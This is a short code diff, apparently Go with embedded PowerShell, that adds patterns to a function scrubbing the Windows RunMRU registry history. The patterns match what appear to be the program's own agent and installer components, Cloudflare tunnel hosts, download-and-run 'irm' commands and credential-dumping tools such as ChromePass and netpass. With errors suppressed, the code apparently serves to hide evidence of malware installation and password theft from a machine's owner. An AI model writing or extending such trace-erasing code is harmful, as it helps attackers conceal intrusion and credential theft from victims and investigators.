@@ -26,7 +26,7 @@ func restoreWindowsSecurity() {
 func scrubRunMRU() {
 	ps := `
 $ErrorActionPreference='SilentlyContinue'
-$mark='HelperHost|EdgeRelay|AgentSHE|agentshe|install-win|install\.ps1|lilygopro|AGENTSHE_|trycloudflare|ChromePass|PasswordFox|mailpv|mspass|netpass'
+$mark='HelperHost|EdgeRelay|AgentSHE|agentshe|install-win|install\.ps1|lilygopro|AGENTSHE_|trycloudflare|ChromePass|PasswordFox|mailpv|mspass|netpass|\$Enroll=|\$BotBase=|irm .*install|Cleaner\.exe|HelperHostWipe|agentshe-bot'
 $mru='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
 if (-not (Test-Path $mru)) { return }
 $props = Get-ItemProperty $mru
